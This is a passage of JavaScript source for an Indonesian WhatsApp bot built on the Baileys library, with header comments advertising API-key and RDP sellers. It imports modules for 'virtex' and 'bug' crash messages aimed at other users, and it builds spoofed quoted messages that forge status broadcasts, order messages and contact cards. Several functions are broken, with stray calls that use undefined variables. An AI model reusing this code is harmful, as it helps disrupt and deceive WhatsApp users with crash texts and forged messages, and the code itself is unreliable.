//Dhani Cuma Recode Ya Kawan
//https://wa.me/message/IMGMIAUAWC54J1

//Fitur Gak Work?? Butuh Apikey Bang

//<=========[ YANG JUAL APIKEY ]=========>
//Beli Di No Ini
//wa.me/6285959375675
//wa.me/6281946983575 Xteam
//wa.me/62895418200111 Lolhuman

//<=========[ BUTUH RDP?? ]=========>
//wa.me/6285763190221
//Harga Murah²

//<=========[ EDIT SESUKA LU,EROR NANGES ]=========>
const {
    WAConnection,
	MessageType,
	Presence,
	MessageOptions,
	Mimetype,
	WALocationMessage,
	WA_MESSAGE_STUB_TYPES,
	WA_DEFAULT_EPHEMERAL,
	ReconnectMode,
	ProxyAgent,
	ChatModification,
	GroupSettingChange,
	waChatKey,
	mentionedJid,
	processTime,
	Browsers,
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone")
const speed = require('performance-now')
const { spawn, exec, execSync } = require("child_process")
const ffmpeg = require('fluent-ffmpeg')
const twitterGetUrl = require("twitter-url-direct")
const googleImage = require('g-i-s')
const brainly = require('brainly-scraper')
const fetch = require('node-fetch');
const request = require('request');
const cheerio = require('cheerio')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const axios = require("axios")
const fs = require("fs-extra")
const util = require('util')
const got = require("got");
const qrcodes = require('qrcode');
const imgbb = require('imgbb-uploader');
const os = require('os');

//𝙁𝘼𝙆𝙀 𝙉𝙔𝘼 𝘽𝘼𝙉𝙂
rezakon = '㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧'
fake = '㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧'
//Ganti No Owner Ok
const Tag = "6287778886786"

// stickwm
const Exif = require('./lib/exif');
const exif = new Exif();
//LOCATED
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType

const { allmenu } = require('./message/allmenu.js')
const { downloadMenu, infoMenu, gameMenu, bugMenu, soundMenu, groupMenu, bokepMenu, funMenu, wibuMenu, ownerMenu, stickerMenu, otherMenu, infoOwner , rulesBot } = require('./message/help.js')
const { getBuffer, getGroupAdmins, getRandom, runtime, sleep } = require('./lib/myfunc')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetch')
const { color, bgcolor } = require('./lib/color')
const { mess } = require('./message/mess')
const { Toxic } = require('./lib/Toxic.js')
const { cmdadd } = require('./lib/totalcmd.js')
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage')
const { isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { onGoing, dadu, asupan } = require("./lib/otakudesu.js")
const { mediafireDl } = require('./lib/mediafire.js')
const { pinterest } = require('./lib/pinterest')
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { ythd } = require('./lib/ytdl')
const { upload } = require('./lib/kontol')
const premium = require("./lib/premium");
const afk = require("./lib/afk");
//const { bughole } = require('./lib/bughole.js')
const { virtex, vipi } = require('./lib/virtex.js')
const { virtex2 } = require('./lib/virtex2.js')
const { virtex9 } = require('./lib/virtex9.js')
const { virtag } = require('./lib/virtag.js')
const level = require("./lib/level");
const atm = require("./lib/atm");
const _sewa = require("./lib/sewa");
var kuis = false
hit_today = []
ky_ttt = []
const setGelud = require('./lib/gameGelud.js')
const game = require("./lib/game");
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]

let imagehisnu =  fs.readFileSync("./media/wpmobile.png")
let fakeimage = fs.readFileSync("./media/Menu.jpg")
let imgcel = fs.readFileSync("./media/Nakano.jpg")
let errorImg = 'https://i.ibb.co/FBm52Pt/1e0fe6a08b67.jpg'
let setting = JSON.parse(fs.readFileSync('./setting.json'))

owner = setting.owner
gamewaktu = setting.gamewaktu

// Database
let register = JSON.parse(fs.readFileSync('./database/user/register.json'))
let welkom = JSON.parse(fs.readFileSync('./database/group/welcome.json'))
let _premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let _afk = JSON.parse(fs.readFileSync('./database/user/afk.json'));
let _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
let _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
let _uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
let glimit = JSON.parse(fs.readFileSync('./database/user/glimit.json'));
let antivirtex = JSON.parse(fs.readFileSync("./database/antivirtex.json"))
let antihidetg = JSON.parse(fs.readFileSync("./database/antihidetag.json"))
let antilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'));
let ban = JSON.parse(fs.readFileSync('./database/user/banned.json'));
let mute = JSON.parse(fs.readFileSync('./database/group/mute.json'));
let _update = JSON.parse(fs.readFileSync('./database/bot/update.json'))
let sewa = JSON.parse(fs.readFileSync('./database/group/sewa.json'));
let _scommand = JSON.parse(fs.readFileSync('./database/bot/scommand.json'))

//ADA LAH
banChats = true
offline = false
antitags = true

// GAME
let tebakanime = JSON.parse(fs.readFileSync('./database/tebakanime.json'))
let tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
let asahotak = JSON.parse(fs.readFileSync('./database/asahotak.json'))
let caklontong = JSON.parse(fs.readFileSync('./database/caklontong.json'))
let tebaksiapaaku = JSON.parse(fs.readFileSync('./database/tebaksiapaaku.json'))
let tebakbendera = JSON.parse(fs.readFileSync('./database/tebakbendera.json'))
let susunkata = JSON.parse(fs.readFileSync('./database/susunkata.json'))
let tebakata = JSON.parse(fs.readFileSync('./database/tebakata.json'))
let tebaklirik = JSON.parse(fs.readFileSync('./database/tebaklirik.json'))
let tebakjenaka = JSON.parse(fs.readFileSync('./database/tebakjenaka.json'))
let tebakimia = JSON.parse(fs.readFileSync('./database/tebakimia.json'))
let kuismath = JSON.parse(fs.readFileSync('./database/kuismath.json'))
let tebaklagu = JSON.parse(fs.readFileSync('./database/tebaklagu.json'))
let tebaktebakan = JSON.parse(fs.readFileSync('./database/tebaktebakan.json'))
let family100 = [];

///Button Text
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
Hisnu.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Hisnu.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
Hisnu.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await Hisnu.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
Hisnu.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Hisnu.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
Hisnu.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
// Sticker Cmd
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}


module.exports = Hisnu = async (Hisnu, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		if (mek.key.id.startsWith('3EB0') && mek.key.id.length === 12) return
		global.ky_ttt
		global.blocked
		mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
        const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
        const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
		const timeMak = moment().tz('Asia/Makassar').format("HH:mm:ss");
        const timeJay = moment().tz('Asia/Jayapura').format("HH:mm:ss");
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const type = Object.keys(mek.message)[0]        
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        const prefix = /^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/gi) : '!'
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		hit_today.push(command)
		const arg = body.substring(body.indexOf(' ') + 1)
		const ar = args.map((v) => v.toLowerCase())
		const argz = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix) 
		if (isCmd) cmdadd()
		const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
        const q = args.join(' ')

        const botNumber = Hisnu.user.jid
        const ownerNumber = setting.ownerNumber
		const ownerName = setting.ownerName
		const botName = setting.botName
		const isGroup = from.endsWith('@g.us')	
		let sender = isGroup ? mek.participant : mek.key.remoteJid
	    let senderr = mek.key.fromMe ? Hisnu.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
		const totalchat = await Hisnu.chats.all()
		const groupMetadata = isGroup ? await Hisnu.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
 		const isGroupAdmins = groupAdmins.includes(sender) || false
        const tescuk = ["0@s.whatsapp.net"]
        const c = args.join(' ')
        const conts = mek.key.fromMe ? Hisnu.user.jid : Hisnu.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? Hisnu.user.name : conts.notify || conts.vname || conts.name || '-'
        const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByreply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByreply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
		idttt = []
	    players1 = []
	    players2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
}
	    const isTTT = isGroup ? idttt.includes(from) : false
	    isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
        const isOwner = ownerNumber.includes(senderr)
        const isRegister = register.includes(sender)
        const isPremium = premium.checkPremiumUser(sender, _premium)
        const isSewa = _sewa.checkSewaGroup(from, sewa)
        const isAfkOn = afk.checkAfkUser(sender, _afk)
        const isLevelingOn = isGroup ? _leveling.includes(from) : false
        const isMuted = isGroup ? mute.includes(from) : false
		const isAntivirtex = isGroup ? antivirtex.includes(from) : false
		const isAntihidetag = isGroup ? antihidetg.includes(from) : false        
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const isBanned = ban.includes(sender)
        const isWelkom = isGroup ? welkom.includes(from) : false
        
        //𝘽𝙐𝙏𝙏𝙊𝙉 𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉
        selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''

        responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''

        const gcount = setting.gcount
        
          
        const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = Hisnu.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "𝐹𝑂𝐿𝐿𝑂𝑊 𝐼𝐺 : @𝑘𝑢𝑛𝑧.𝑠𝑡𝑜𝑟𝑒","footerText": "𝐶𝑟𝑒𝑎𝑡𝑜𝑟 : 𝐾𝑢𝑛𝑧𝑥𝐷\n0877-7888-6786","listType": "SINGLE_SELECT","sections": list}}, {})
            return Hisnu.relayWAMessage(po, {waitForAck: true})
        }
        const katalog = (teks) => {
            res = Hisnu.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": -73926483, "message": teks, "footerText": "𝐼𝑡𝑠 𝑀𝑒 𝐾𝑢𝑛𝑧 𝐵𝑜𝑡𝑧\n𝐶𝑟𝑒𝑎𝑡𝑜𝑟 : 𝐾𝑢𝑛𝑧𝑥𝐷", "thumbnail": fakeimage, "surface": 'CATALOG' }}, {quoted:ftroli})
            Hisnu.relayWAMessage(res)
        }        
        const isUrl = (url) => {
            return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
        const cel =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imagehisnu, surface: 200, message: fake, orderTitle: '𝘽𝙤𝙩𝙯 𝘿𝙝𝙖𝙣𝙞 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩', sellerJid: '0@s.whatsapp.net'} } }       

        const ftroli =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imgcel, surface: 200, message: fake, orderTitle: '𝑰𝒕𝒔 𝑴𝒆 𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : 𝑫𝒉𝒂𝒏𝒊 𝑮𝒂𝒏𝒔', sellerJid: '0@s.whatsapp.net'} } }       

        const fkon =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: fakeimage, surface: 200, message: rezakon, orderTitle: '𝑰𝒕𝒔 𝑴𝒆 𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : 𝑫𝒉𝒂𝒏𝒊 𝑮𝒂𝒏𝒔', sellerJid: '0@s.whatsapp.net'} } }       

        function monospace(string) {
            return '```' + string + '```'
        }   
        function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
        function randomNomor(angka){
            return Math.floor(Math.random() * angka) + 1
        }
        const reply = (teks) => {
	      Hisnu.sendMessage(from, teks, text, {quoted:mek, thumbnail: fakeimage})
        }
        const sendMess = (hehe, teks) => {
           Hisnu.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
           (id == null || id == undefined || id == false) ? Hisnu.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/wpmobile.png')}, extendedText, { sendEphemeral: true, contextInfo: { "mentionedJid": memberr } }) : Hisnu.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/wpmobile.png')}, extendedText, { sendEphemeral: true, quoted: mek, contextInfo: { "mentionedJid": memberr } })
        
        const meky = "6281333603591@s.whatsapp.net" //ganti nomer lu
Hisnu.sendMessage(from, gambar, image, {thumbnail: fakeimg, quoted:xyz, contextInfo:{"forwardingScore":999,"isForwarded":true, "mentionedJid": [SadGril],"externalAdReply": {"title": `Hai Kak ${pushname}👋🏻`, mediaType: 2, "thumbnailUrl": "https://telegra.ph/file/6b0259fd741e108910fbe.jpg","previewType": "VIDEO","mediaUrl": `https://youtu.be/pJU6Rr3SQ4g`}}})
        }
        const fakestatus = (teks) => {
            Hisnu.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./media/Menu.jpg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const sendText = (from, text) => {
           Hisnu.sendMessage(from, text, MessageType.text)
        }
        const textImg = (teks) => {
           return Hisnu.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync('./media/wpmobile.png')})
        }
        const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./media/Nakano.jpg')
        }}}
       const math = (teks) => {
           return Math.floor(teks)
       }
       const kick = function(from, orangnya){
	       for (let i of orangnya){
	       Hisnu.groupRemove(from, [i])
        }
        }
       const kickMember = async(id, target = []) => {
           let group = await Hisnu.groupMetadata(id)
           let owner = group.owner.replace("c.us", "s.whatsapp.net")
           let me = Hisnu.user.jid
           for (i of target) {
           if (!i.includes(me) && !i.includes(owner)) {
           await Hisnu.groupRemove(to, [i])
        } else {
           await Hisnu.sendMessage(id, "Not Premited!", "conversation")
           break
        }
    }
}
       const add = function(from, orangnya){
	       Hisnu.groupAdd(from, orangnya)
}
       const sendKontak = (from, nomor, nama, org = "") => {
	       const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	       Hisnu.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: mek})
}
      const hideTag = async function(from, text){
	       let anu = await Hisnu.groupMetadata(from)
	       let members = anu.participants
	       let ane = []
	       for (let i of members){
	       ane.push(i.jid)
}
	       Hisnu.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('media/Nakano.jpg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
}  
      const sendWebp = async(to, url) => {
           var names = Date.now() / 10000;
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, './sticker' + names + '.png', async function () {
           console.log('selesai');
           let filess = './sticker' + names + '.png'
           let asw = './sticker' + names + '.webp'
           exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {
           fs.unlinkSync(filess)
           if (err) return reply(`${err}`)
           exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
           if (error) return reply(`${error}`)
           Hisnu.sendMessage(from, fs.readFileSync(asw), sticker, {sendEphemeral:true, quoted:mek})
           fs.unlinkSync(asw)
});
});
});
}
       const sendMediaURL = async(to, url, text="", mids=[]) =>{
           if(mids.length > 0){
           text = normalizeMention(to, text, mids)
}
           const fn = Date.now() / 10000;
           const filename = fn.toString()
           let mime = ""
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           mime = res.headers['content-type']
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, filename, async function () {
           console.log('done');
           let media = fs.readFileSync(filename)
           let type = mime.split("/")[0]+"Message"
           if(mime === "image/gif"){
           type = MessageType.video
           mime = Mimetype.gif
}
           if(mime.split("/")[0] === "audio"){
           mime = Mimetype.mp4Audio
}
           Hisnu.sendMessage(to, media, type, {quoted: mek, mimetype: mime, caption: text, thumbnail: Buffer.alloc(0), contextInfo: {"mentionedJid": mids}})
                     
           fs.unlinkSync(filename)
});
}

      const sendFileFromUrl = async(link, type, options) => {
           hasil = await getBuffer(link)
	       Hisnu.sendMessage(from, hasil, type, options).catch(e => {
	       fetch(link).then((hasil) => {
	       Hisnu.sendMessage(from, hasil, type, options).catch(e => {
	       Hisnu.sendMessage(from, { url : link }, type, options).catch(e => {
	       reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	       console.log(e)
})
})
})
})
}
      const promoteAdmin = async function(to, target=[]){
           if(!target.length > 0) { return  reply("No target..") }
           let g = await Hisnu.groupMetadata(to)
           let owner = g.owner.replace("c.us","s.whatsapp.net")
           let me = Hisnu.user.jid
           for (i of target){
           if (!i.includes(me) && !i.includes(owner)){
           const res = await Hisnu.groupMakeAdmin(to, [i])
           }else{
           reply("NOT PREMITED")
}
}
}
      function addMetadata(packname, author) {
      if (!packname) packname = 'HISNU';
      if (!author) author = '081333603591';
      author = author.replace(/[^a-zA-Z0-9]/g, '');
      let name = `${author}_${packname}`
      if (fs.existsSync(`./${name}.exif`)) return `./${name}.exif`
      const json = {
      "sticker-pack-name": packname,
      "sticker-pack-publisher": author,
      }
      const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
      const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]
      let len = JSON.stringify(json).length
      let last
      if (len > 256) {
      len = len - 256
      bytes.unshift(0x01)
      } else {
      bytes.unshift(0x00)
      }
      if (len < 16) {
      last = len.toString(16)
      last = "0" + len
      } else {
      last = len.toString(16)
      }
      const buf2 = Buffer.from(last, "hex")
      const buf3 = Buffer.from(bytes)
      const buf4 = Buffer.from(JSON.stringify(json))
      const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])
      fs.writeFile(`./${name}.exif`, buffer, (err) => {
      return `./${name}.exif`	
	
      })	


      }
			const uploadImages = (buffData, type) => {    
      // eslint-disable-next-line no-async-promise-executor          
      return new Promise(async (resolve, reject) => {        
      const { ext } = await fromBuffer(buffData)       
      const cmd = text.toLowerCase()      
      const filePath = 'utils/tmp.' + ext       
      const _buffData = type ? await resizeImage(buffData, false) : buffData        
      fs.writeFile(filePath, _buffData, { encoding: 'base64' }, (err) => {			
      if (err) return reject(err)
      console.log('Uploading image to telegra.ph server...')			
      const fileData = fs.readFileSync(filePath)			
      const form = new FormData()			
      form.append('file', fileData, 'tmp.' + ext)          
      fetch('https://telegra.ph/upload', {			   
      method: 'POST',           	
      body: form			
      })           	
      .then(res => res.json())           	
      .then(res => {			
      if (res.error) return reject(res.error)			
      resolve('https://telegra.ph' + res[0].src)           	
      })           	
      .then(() => fs.unlinkSync(filePath))			   
      .catch(err => reject(err))			   
      })			 
      })			
      }
           	
      const sendStickerFromUrl = async(to, url) => {           	
      var names = Date.now() / 10000;           	
      var download = function (uri, filename, callback) {			
      request.head(uri, function (err, res, body) {			   
      request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);			
      });           	
      };           	
      download(url, './sticker' + names + '.png', async function () {			
      console.log('selesai');			
      let filess = './sticker' + names + '.png'			
      let asw = './sticker' + names + '.webp'           	   
      exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {			  
      let media = fs.readFileSync(asw)			   
      Hisnu.sendMessage(to, media, MessageType.sticker,{quoted:mek})			   
      fs.unlinkSync(filess)			   
      fs.unlinkSync(asw)			
      });           	
      });			
      }

      const sendStickerUrl = async(to, url) => {			
      console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))           	
      var names = getRandom('.webp')           	
      var namea = getRandom('.png')           	
      var download = function (uri, filename, callback) {           	
      request.head(uri, function (err, res, body) {           		
      request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);           	
      });           	
      };           	
      download(url, namea, async function () {           	
      let filess = namea           	
      let asw = names           	
      require('./lib/exif.js')           	
      exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {           	
      exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {           	
      let media = fs.readFileSync(asw)           	
      Hisnu.sendMessage(to, media, sticker,{quoted : mek})           	
      console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
      });           	
      });           	
      });			
      }
      const demoteAdmin = async function(to, target=[]){
           if(!target.length > 0) { return  reply("No target..") }
           let g = await Hisnu.groupMetadata(to)
           let owner = g.owner.replace("c.us","s.whatsapp.net")
           let me = Hisnu.user.jid
           for (i of target){
           if (!i.includes(me) && !i.includes(owner)){
           const res = await Hisnu.groupDemoteAdmin(to, [i])
           }else{
           reply("NOT PREMITED")
}
}
}
          let authorname = Hisnu.contacts[from] != undefined ? Hisnu.contacts[from].vname || Hisnu.contacts[from].notify : undefined	
          if (authorname != undefined) { } else { authorname = groupName }	
          function addMetadata(packname, author) {	
          if (!packname) packname = 'WABot'; if (!author) author = 'Bot';author = author.replace(/[^a-zA-Z0-9]/g, '');	
          let name = `${author}_${packname}`
          if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`
          const json = {	
         "sticker-pack-name": packname,
         "sticker-pack-publisher": author,
}
         const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
         const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
         let len = JSON.stringify(json).length	
         let last	
         if (len > 256) {	
         len = len - 256	
         bytes.unshift(0x01)	
         } else {	
         bytes.unshift(0x00)	
}	
         if (len < 16) {	
         last = len.toString(16)	
         last = "0" + len	
         } else {	
         last = len.toString(16)	
}	
       const buf2 = Buffer.from(last, "hex")	
	   const buf3 = Buffer.from(bytes)	
	   const buf4 = Buffer.from(JSON.stringify(json))	
	   const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
	   fs.writeFile(`./sticker/${name}.exif`, buffer, (err) => {	
	   return `./sticker/${name}.exif`	
})	
}

     const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = '𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑴𝒂𝒍𝒂𝒎'
}
        if(time2 < "19:00:00"){
        var ucapanWaktu = '𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑷𝒆𝒕𝒂𝒏𝒈'
}
        if(time2 < "18:00:00"){
        var ucapanWaktu = '𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑺𝒐𝒓𝒆'
}
        if(time2 < "15:00:00"){
